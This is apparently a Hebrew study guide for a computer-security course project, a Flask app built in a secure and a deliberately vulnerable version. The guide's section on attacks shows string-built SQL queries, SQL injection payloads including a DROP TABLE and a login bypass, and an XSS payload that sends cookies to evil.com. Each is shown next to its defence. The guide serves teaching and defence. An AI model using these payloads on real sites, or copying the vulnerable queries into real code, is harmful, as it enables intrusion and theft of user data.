## 0. המטלה – מה נדרש בפרויקט?

> **זוהי עבודת גמר בקורס אבטחת מחשבים.**
> המטרה היא לבנות מערכת ווב לחברת תקשורת דמיונית בשם **Comunication_LTD**, ולהדגים בה גם פרצות אבטחה וגם הגנות מפניהן.

### רקע

החברה משווקת חבילות גלישה באינטרנט. במאגר המידע שלה יש לקוחות, חבילות גלישה וסקטורים. יש לבנות מערכת ווב שמנהלת את המידע הזה.

| דרישה | מה בנינו |
|---|---|
| מסד נתונים רלציוני (SQL Express / MySQL) | SQLite – קובץ `communication_ltd.db` |
| אתר ווב בשפה לבחירה (Python / Java / C#) | Python + Flask |

### חלק א' – פיתוח מאובטח (5 סעיפים)

זה החלק שבו בונים אתר תקין ומאובטח. **הקובץ: `app_secure.py`**

#### סעיף 1 – מסך Register (הרשמת משתמש חדש)
- רישום משתמש עם שם משתמש, סיסמא ומייל
- הסיסמא חייבת לעמוד בדרישות מורכבות (מוגדרות בקובץ קונפיגורציה)
- **הסיסמא נשמרת מוצפנת** – באמצעות HMAC + Salt (לא בטקסט פשוט!)

#### סעיף 2 – מסך שינוי סיסמא
- המשתמש מזין את הסיסמא הנוכחית לאימות
- הסיסמא החדשה חייבת לעמוד בדרישות הקונפיגורציה
- לא ניתן לחזור לאחת מ-3 הסיסמאות האחרונות (היסטוריה)

#### סעיף 3 – מסך Login (כניסה למערכת)
- כניסה עם שם משתמש וסיסמא
- הודעת שגיאה **גנרית** (לא מגלים אם המשתמש קיים)
- נעילת חשבון אחרי 3 ניסיונות כושלים

#### סעיף 4 – מסך מערכת (הוספת לקוח)
- הוספת לקוח חדש עם פרטים: שם, מייל, טלפון, חבילה
- הצגת שם הלקוח שנוסף על המסך

#### סעיף 5 – מסך "שכח סיסמא"
- המשתמש מבקש איפוס
- המערכת מייצרת קוד אקראי **מבוסס SHA-1** ושולחת אותו למייל
- המשתמש מזין את הקוד כדי להגיע למסך שינוי הסיסמא

### חלק ב' – הדגמת התקפות והגנות (XSS + SQLi)

זה החלק שבו מדגימים פרצות אבטחה קלאסיות. **הקובץ: `app_vulnerable.py`**

> **חשוב:** יש להגיש **שתי גרסאות** – גרסה פגיעה וגרסה מאובטחת.

#### מה מדגימים?

| סעיף | סוג התקפה | איפה | הגנה בגרסה המאובטחת |
|---|---|---|---|
| ב'1 | **Stored XSS** – הזרקת JavaScript | סעיף 4 (System) | Jinja2 autoescaping + `html.escape()` |
| ב'2 | **SQL Injection** – הזרקת SQL | סעיפים 1+3+4+5 (Register, Login, System, Forgot Password) | Parameterized Queries (`?`) |
| ב'3 | פתרון ל-XSS | - | קידוד תווים מיוחדים (`< → &lt;`) |
| ב'4 | פתרון ל-SQLi | - | שימוש ב-Parameters או Stored Procedures |

#### SQL Injection – בקצרה
תוקף מזין לשדה הטקסט קוד SQL במקום שם משתמש רגיל.
בגרסה הפגיעה השאילתה מורכבת בשרשור, ולכן הקוד הזדוני מתפרש כפקודה.
בגרסה המאובטחת, נתוני המשתמש **לעולם לא מתפרשים כ-SQL**.

#### Stored XSS – בקצרה
תוקף מזין קוד JavaScript כשם לקוח.
בגרסה הפגיעה הקוד נשמר במסד ומורץ אצל **כל** מי שפותח את הדף.
בגרסה המאובטחת, תווי HTML מקודדים ומוצגים כטקסט בלבד.

## 2. מושגי יסוד שחייבים להכיר

### 2.1 מה זה אתר ווב?

דמיינו שאתה פותח את האפליקציה של הבנק. מה שאתה רואה (כפתורים, טפסים, טקסט) – זה **Frontend**.
מה שקורה מאחורי הקלעים (בדיקת הסיסמא, שליפת היתרה) – זה **Backend**.

```
הדפדפן שלך  ←──── בקשה (Request) ────→  השרת (Backend)
             ←──── תשובה (Response) ───  Flask + Python
```

בפרויקט הזה השתמשנו ב-**Python** + **Flask** לבנות את ה-Backend.

---

### 2.2 מה זה Flask?

**Flask** הוא כלי Python שמאפשר לנו לבנות אתר ווב בקלות.

בלי Flask הייתם צריכים לכתוב עשרות אלפי שורות קוד. עם Flask – כמה עשרות.

דוגמא פשוטה:
```python
from flask import Flask
app = Flask(__name__)

@app.route("/hello")          # כשמישהו נכנס לכתובת /hello
def hello():
    return "שלום עולם!"       # הוא מקבל את המחרוזת הזו
```

### 2.4 מה זה SQL?

**SQL** היא שפת שאילתות – שפה שמשמשת לדבר עם מסד הנתונים.

דוגמאות:
```sql

-- חיפוש משתמש ספציפי

-- הוספת משתמש חדש

-- עדכון

```

### 2.5 מה זה Hash? (ולמה לא שומרים סיסמאות רגילות?)

**הבעיה:** אם מסד הנתונים נפרץ ושם כתוב `סיסמא: 1234` – כולם נחשפו.

**הפתרון:** שומרים לא את הסיסמא, אלא את ה-**Hash** שלה.

Hash הוא פונקציה חד-כיוונית:
- `"1234"` → Hash → `"03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4"`
- אי אפשר לחזור מה-Hash לסיסמא המקורית
- אותה קלט תמיד נותן אותו Hash

**הבעיה עם Hash פשוט:**
אם לשניים יש את אותה סיסמא, ה-Hash שלהם זהה. תוקף שרואה את הטבלה יכול לנחש.

**הפתרון: Salt**

**Salt** הוא מחרוזת אקראית שמוסיפים לסיסמא לפני ה-Hash:

```
סיסמא: "1234"
Salt:   "x9k2m..." (אקראי לכל משתמש)
Hash:   HMAC("1234" + "x9k2m...") → תוצאה שונה לכל משתמש!
```

בפרויקט השתמשנו ב-**HMAC-SHA256** – גרסה מחוזקת של Hash שמשתמשת ב-Salt כמפתח.

**מה שנשמר במסד:**
- ה-Hash (לא הסיסמא!)
- ה-Salt (כדי שנוכל לאמת בהתחברות)

**אימות בהתחברות:**
```
משתמש הזין: "1234"
Salt מהמסד: "x9k2m..."
חישוב:      HMAC("1234" + "x9k2m...")
השוואה:     האם התוצאה == Hash שבמסד?
```

### 2.6 מה זה Jinja2 ו-Templates?

**Jinja2** הוא מנוע תבניות – מאפשר לנו לכתוב HTML עם לוגיקה דינמית.

```html

```

Flask לוקח את התבנית, ממלא את הערכים מ-Python, ושולח HTML מלא לדפדפן.

## 5. חלק א׳ – פיתוח מאובטח

> **חלק א' = קוד מאובטח = `app_secure.py`**

### 5.1 סעיף 1 – מסך Register (הרשמה)

**מה קורה כשמשתמש נרשם:**

```
1. משתמש ממלא: username="arad", password="Test@12345", email="arad@mail.com"
2. בדיקת מדיניות סיסמא (config.json)
3. יצירת Salt אקראי: "c8d2f4a1..."
4. חישוב HMAC-SHA256: hash("Test@12345" + Salt) = "3f4a9b..."
5. שמירה במסד: username, hash, salt, email  ← הסיסמא עצמה לא נשמרת!
```

**הקוד:**
```python
# app_secure.py – register route
pw_hash, salt = hash_password(password)     # HMAC + Salt
conn.execute(
    "INSERT INTO users (username, password_hash, salt, email) VALUES (?, ?, ?, ?)",
    (username, pw_hash, salt, email)         # ? = Parameterized Query (הגנה מ-SQLi)
)
```

---

### 5.2 סעיף 2 – מסך שינוי סיסמא

**הבדיקות שמתבצעות:**
1. האם הסיסמא הנוכחית נכונה?
2. האם הסיסמא החדשה עומדת במדיניות (config.json)?
3. האם הסיסמא החדשה לא הייתה בשימוש ב-3 האחרונות?

**היסטוריית סיסמאות:**

```python
# שמירת הסיסמא הישנה בהיסטוריה לפני החלפה
history.append([user["password_hash"], user["salt"]])
history = history[-3:]   # שמור רק 3 אחרונות

# בדיקה שהסיסמא החדשה לא בהיסטוריה
for old_hash, old_salt in history:
    if verify_password(new_password, old_hash, old_salt):
        # אותה סיסמא! חסום.
```

### 5.3 סעיף 3 – מסך Login (התחברות)

**תהליך ההתחברות:**

```
1. משתמש הזין: username="arad", password="Test@12345"
2. חיפוש במסד: SELECT * FROM users WHERE username = ?
3. אם לא נמצא: הודעה גנרית "שם משתמש או סיסמא שגויים"
                          ↑ לא אומרים "שם משתמש לא קיים" – לא מגלים מידע!
4. אם נמצא ונעול: "החשבון נעול"
5. אם נמצא: חישוב HMAC עם ה-Salt מהמסד, השוואה ל-Hash
6. כישלון: מונה++ , אחרי 3 → נועל חשבון
7. הצלחה: שמירת "username" ב-Session (כמו cookie מאובטח)
```

**מה זה Session?**

Session הוא מנגנון שמאפשר "לזכור" שמשתמש מחובר בין דפים שונים.
כשמתחבר, Flask שומר `session["username"] = "arad"`. בכל בקשה הבאה – בודק שהמשתנה קיים.

### 5.4 סעיף 4 – מסך מערכת (הוספת לקוח)

```python
# app_secure.py – system route
name = request.form.get("name", "").strip()

# SECURE: Parameterized Query
conn.execute(
    "INSERT INTO customers (name, email, phone, package) VALUES (?, ?, ?, ?)",
```

בתבנית HTML, Jinja2 מקודד אוטומטית:
```html
{{ customer.name }}     ← אם name = "<script>alert(1)</script>"
                          יוצג: &lt;script&gt;alert(1)&lt;/script&gt;
                          הדפדפן יציג את הטקסט – לא יריץ את הסקריפט
```

### 5.5 סעיף 5 – מסך שכח סיסמא

**התהליך:**

```
1. משתמש מזין username
2. המערכת יוצרת bytes אקראיים (32 bytes = 256 bit)
3. מחשבת SHA-1 על ה-bytes → קוד של 40 תווים הקסדצימליים
4. שומרת את הקוד במסד (טבלת reset_tokens)
5. שולחת את הקוד למייל המשתמש
6. משתמש מזין את הקוד + סיסמא חדשה
7. מערכת מוצאת את הקוד במסד, מעדכנת סיסמא, מסמנת used=1
```

**למה SHA-1 ולא HMAC?**

הפרויקט דורש במפורש SHA-1 לטוקן האיפוס. שימו לב שב-2024 SHA-1 **לא מומלץ לסיסמאות**, אבל לטוקן חד-פעמי של איפוס – מקובל.

```python
# utils.py
def generate_reset_token() -> str:
    random_bytes = secrets.token_bytes(32)
    return hashlib.sha1(random_bytes).hexdigest()  # 40 תווים הקס
```

### 6.1 SQL Injection (SQLi) – הסבר מפורט

#### מה זה?

SQL Injection היא תקיפה שמנצלת אפליקציה שבונה שאילתות SQL בשרשור מחרוזות.
זו אחת ההתקפות הנפוצות והמסוכנות ביותר (Top 1 ב-OWASP מזה שנים רבות).

---

#### הדגמה – Login פגיע (סעיף 3)

**הקוד הפגיע:**
```python
# app_vulnerable.py – login route
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**קלט רגיל:**
```
username = "arad"
שאילתה שנוצרת: SELECT * FROM users WHERE username = 'arad'
תוצאה: שורה של arad ✓
```

**קלט זדוני (SQLi):**
```
username = "' OR '1'='1' --"
שאילתה שנוצרת: SELECT * FROM users WHERE username = '' OR '1'='1' --'
                                                              ↑
                                               -- מבטל את כל מה שאחריו!
                                               '1'='1' תמיד נכון!
תוצאה: מחזיר את כל המשתמשים → כניסה ללא סיסמא!
```

---

#### הדגמה – Register פגיע (סעיף 1)

**הקוד הפגיע:**
```python
# app_vulnerable.py – register route
query = f"INSERT INTO users (username, password_hash, salt, email) VALUES ('{username}', '{pw_hash}', '{salt}', '{email}')"
```

**קלט זדוני (SQLi):**
```
username = "legit', 'fakehash', 'fakesalt', 'hacker@evil.com'); --"
שאילתה שנוצרת:
INSERT INTO users (...) VALUES ('legit', 'fakehash', 'fakesalt', 'hacker@evil.com'); --', ...)
                                                                                      ↑
                                                                         -- מבטל את המשך השאילתה!
תוצאה: תוקף יכול ליצור משתמש עם כל מה שירצה!
```

---

#### הדגמה – System פגיע (סעיף 4)

**הקוד הפגיע:**
```python
# app_vulnerable.py – system route
query = f"INSERT INTO customers (name, email, phone, package) VALUES ('{name}', '{email}', '{phone}', '{package}')"
```

**קלט זדוני שמוחק טבלה שלמה:**
```
name = "test', 'x','x','x'); DROP TABLE customers; --"
שאילתה שנוצרת:
INSERT INTO customers (...) VALUES ('test', 'x','x','x'); DROP TABLE customers; --', ...)
תוצאה: מחיקת כל טבלת הלקוחות!!!
```

---

#### הדגמה – Forgot Password פגיע (סעיף 5)

**הקוד הפגיע:**
```python
# app_vulnerable.py – forgot_password route
query = f"SELECT * FROM users WHERE username = '{username}'"
user = conn.execute(query).fetchone()
```

**קלט זדוני:**
```
username = "' OR 1=1 --"
שאילתה שנוצרת: SELECT * FROM users WHERE username = '' OR 1=1 --'
תוצאה: תמיד מחזיר שורה (המשתמש הראשון במסד) גם אם ה-username לא קיים!
המערכת שולחת טוקן איפוס למייל של אותו משתמש ← חשיפת מנגנון איפוס!
```

---

#### ההגנה – Parameterized Queries (לכל ארבעת הסעיפים)

**הקוד המאובטח:**
```python
# app_secure.py – בכל ה-routes
conn.execute(
    "SELECT * FROM users WHERE username = ?",   ← ? הוא placeholder
    (username,)                                  ← הערך מועבר בנפרד
)
```

**למה זה עובד?**

כשמשתמשים ב-`?`, מסד הנתונים **מקבל את השאילתה והנתונים בנפרד**.
הנתונים לעולם לא מתפרשים כ-SQL – הם תמיד יטופלו כמחרוזת.

```
קלט זדוני: "' OR '1'='1' --"
שאילתה: SELECT * FROM users WHERE username = ?
נתון:   "' OR '1'='1' --"   ← מחרוזת רגילה, ה-' לא שובר כלום
תוצאה: לא נמצא משתמש עם שם "' OR '1'='1' --" ✓
```

#### שיטה נוספת – Stored Procedures

במסד נתונים גדולים (SQL Server, MySQL) ניתן גם להגדיר Stored Procedure:
```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
    SELECT * FROM users WHERE username = @username
```
הפרמטרים מוגדרים מראש ← גם הם מונעים SQLi.

### 6.2 Stored XSS – הסבר מפורט

#### מה זה XSS?

**XSS (Cross-Site Scripting)** היא תקיפה שמאפשרת לתוקף להחדיר **קוד JavaScript** לתוך דף האינטרנט.

הדפדפן של הקורבן מריץ את הקוד הזדוני כאילו הוא חלק לגיטימי מהאתר.

**Stored XSS** (XSS מאוחסן) = הקוד הזדוני **נשמר במסד הנתונים** ומוצג לכל מי שפותח את הדף.

---

#### הדגמה – הוספת לקוח פגיעה (סעיף 4)

**הקוד הפגיע:**

בצד השרת (`app_vulnerable.py`):
```python
name = request.form.get("name", "")   # ← ללא ניקוי
```

בתבנית HTML (`system.html`):
```html
{{ customer.name | safe }}    ← | safe אומר ל-Jinja2 "אל תקודד, סמוך"
```

**קלט זדוני (XSS):**
```
name = "<script>alert('נפרצת!')</script>"
מה שנשמר במסד: "<script>alert('נפרצת!')</script>"
מה שמוצג: הדפדפן קורא את ה-HTML ומריץ את הסקריפט!
תוצאה: כל מי שפותח את דף הלקוחות – יקבל popup!
```

**התקפה אמיתית יותר:**
```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```
הפקודה הזו שולחת את ה-Cookie של כל קורבן לאתר הרשע!

---

#### ההגנה – HTML Escaping (קידוד תווים מיוחדים)

**שיטה 1: Jinja2 Autoescaping (ברירת המחדל)**

בתבנית המאובטחת (`system.html`):
```html
{{ customer.name }}      ← ללא | safe  →  Jinja2 מקודד אוטומטית
```

Jinja2 ממיר תווים מסוכנים:
| תו מקורי | לאחר קידוד |
|-----------|------------|
| `<`       | `&lt;`     |
| `>`       | `&gt;`     |
| `"`       | `&quot;`   |
| `'`       | `&#39;`    |
| `&`       | `&amp;`    |

**התוצאה:**
```
קלט זדוני: "<script>alert('XSS')</script>"
אחרי קידוד: "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
מה שמוצג:   הטקסט <script>alert('XSS')</script>  ← כטקסט, לא קוד!
```

**שיטה 2: Python escape() (שכבת הגנה נוספת)**

ב-`app_secure.py`:
```python
from html import escape
new_customer_name = escape(name)   # מקודד ברמת Python לפני שהתבנית מקבלת
```

## 7. שאלות נפוצות

**ש: מה ההבדל בין SHA-1 ל-HMAC-SHA256?**

ת: שניהם פונקציות Hash, אבל:
- SHA-1 – פשוט יותר, קצר יותר (40 תווים הקס), פחות בטוח לסיסמאות
- HMAC-SHA256 – משתמש ב-Salt כמפתח, ארוך יותר (64 תווים), הרבה יותר בטוח

בפרויקט: HMAC-SHA256 לסיסמאות, SHA-1 לטוקן האיפוס (כפי שנדרש בפרויקט).

**ש: למה שומרים את ה-Salt במסד? לא מסוכן?**

ת: לא. ה-Salt לא סודי – הוא אקראי. הסוד הוא הסיסמא עצמה.
בלי ה-Salt לא ניתן לאמת את הסיסמא בהתחברות.

**ש: למה פורט 5000 ו-5001?**

ת: כדי שאפשר יהיה להריץ שתי גרסאות בו-זמנית על אותו מחשב.
שתי אפליקציות לא יכולות להאזין על אותו פורט.

**ש: מה עושים אם המייל לא עובד?**

ת: בסביבת פיתוח (ללא הגדרת מייל), המערכת תציג את קוד האיפוס ישירות על המסך.
הקוד יופיע בהודעה כחולה בעמוד "שכח סיסמא".

**ש: האם app_vulnerable.py מיישם גם היסטוריית סיסמאות ונעילת חשבון?**

ת: כן. הפרצות בגרסה הפגיעה הן רק SQLi ו-XSS (כפי שנדרש בחלק ב').
שאר הפונקציות (HMAC, מדיניות סיסמאות, נעילה) פועלות בשתי הגרסאות.
